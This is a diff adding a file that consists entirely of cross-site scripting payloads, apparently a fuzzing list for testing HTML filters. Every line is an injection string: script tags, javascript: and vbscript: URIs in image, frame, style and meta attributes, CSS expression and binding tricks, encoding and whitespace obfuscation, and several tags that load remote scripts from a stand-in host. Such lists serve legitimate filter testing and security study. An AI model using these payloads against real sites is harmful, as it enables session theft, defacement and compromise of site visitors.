@@ -1,0 +1,78 @@
+<SCRIPT>alert('XSS')</SCRIPT> 
+<SCRIPT SRC=http://testsite.com/xss.js></SCRIPT> 
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> 
+<BASE HREF="javascript:alert('XSS');//"> 
+<BGSOUND SRC="javascript:alert('XSS');"> 
+<BODY BACKGROUND="javascript:alert('XSS');"> 
+<BODY ONLOAD=alert('XSS')> 
+<DIV STYLE="background-image: url(javascript:alert('XSS'))"> 
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))"> 
+<DIV STYLE="width: expression(alert('XSS'));"> 
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET> 
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME> 
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"> 
+<IMG SRC="javascript:alert('XSS');"> 
+<IMG SRC=javascript:alert('XSS')> 
+<IMG DYNSRC="javascript:alert('XSS');"> 
+<IMG LOWSRC="javascript:alert('XSS');"> 
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"> 
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS 
+<IMG SRC='vbscript:msgbox("XSS")'> 
+<LAYER SRC="http://testsite.com/scriptlet.html"></LAYER> 
+<IMG SRC="livescript:[code]"> 
+%BCscript%BEalert(%A2XSS%A2)%BC/script%BE 
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"> 
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"> 
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"> 
+<IMG SRC="mocha:[code]"> 
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE> 
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"> 
+<XSS STYLE="xss:expression(alert('XSS'))"> 
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A> 
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE> 
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');"> 
+<LINK REL="stylesheet" HREF="http://testsite.com/xss.css"> 
+<STYLE>@import'http://testsite.com/xss.css';</STYLE> 
+<META HTTP-EQUIV="Link" Content="<http://testsite.com/xss.css>; REL=stylesheet"> 
+<STYLE>BODY{-moz-binding:url("http://testsite.com/xssmoz.xml#xss")}</STYLE> 
+<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE> 
+<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE> 
+<HTML xmlns:xss> <?import namespace="xss" implementation="http://testsite.com/xss.htc"> <xss:xss>XSS</xss:xss> </HTML> 
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]> </C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML> 
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML> <SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN> 
+<XML SRC="http://testsite.com/xsstest.xml" ID=I></XML> <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN> 
+<!--[if gte IE 4]> <SCRIPT>alert('XSS');</SCRIPT> <![endif]--> 
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>"> 
+<XSS STYLE="behavior: url(http://testsite.com/xss.htc);"> 
+<SCRIPT SRC="http://testsite.com/xss.jpg"></SCRIPT> 
+<BR SIZE="&{alert('XSS')}"> 
+<IMG SRC=JaVaScRiPt:alert('XSS')> 
+<IMG SRC=javascript:alert(&quot;XSS&quot;)> 
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> 
+</TITLE><SCRIPT>alert("XSS");</SCRIPT> 
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE> 
+<IMG SRC="jav ascript:alert('XSS');"> 
+<IMG SRC="jav&#x09;ascript:alert('XSS');"> 
+<IMG SRC="jav&#x0A;ascript:alert('XSS');"> 
+<IMG SRC="jav&#x0D;ascript:alert('XSS');"> 
+<IMG SRC = " j a v a s c r i p t : a l e r t ( ' X S S ' ) " > 
+perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";'> out 
+perl -e 'print "&<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out 
+<IMG SRC=" &#14; javascript:alert('XSS');"> 
+<SCRIPT/XSS SRC="http://testsite.com/xss.js"></SCRIPT> 
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")> 
+<SCRIPT SRC=http://testsite.com/xss.js 
+<SCRIPT SRC=//testsite.com/.j> 
+<IMG SRC="javascript:alert('XSS')" 
+<IFRAME SRC=http://testsite.com/scriptlet.html < 
+<<SCRIPT>alert("XSS");//<</SCRIPT> 
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"> 
+<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT> 
+<P STYLE="behavior:url('#default#time2')" onEnd="alert('XSS')">
+<SCRIPT a=">" SRC="http://testsite.com/xss.js"></SCRIPT> 
+<SCRIPT ="blah" SRC="http://testsite.com/xss.js"></SCRIPT> 
+<SCRIPT a="blah" '' SRC="http://testsite.com/xss.js"></SCRIPT> 
+<SCRIPT "a='>'" SRC="http://testsite.com/xss.js"></SCRIPT> 
+<SCRIPT a=`>` SRC="http://testsite.com/xss.js"></SCRIPT> 
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://testsite.com/xss.js"></SCRIPT> 
+<SCRIPT a=">'>" SRC="http://testsite.com/xss.js"></SCRIPT> 
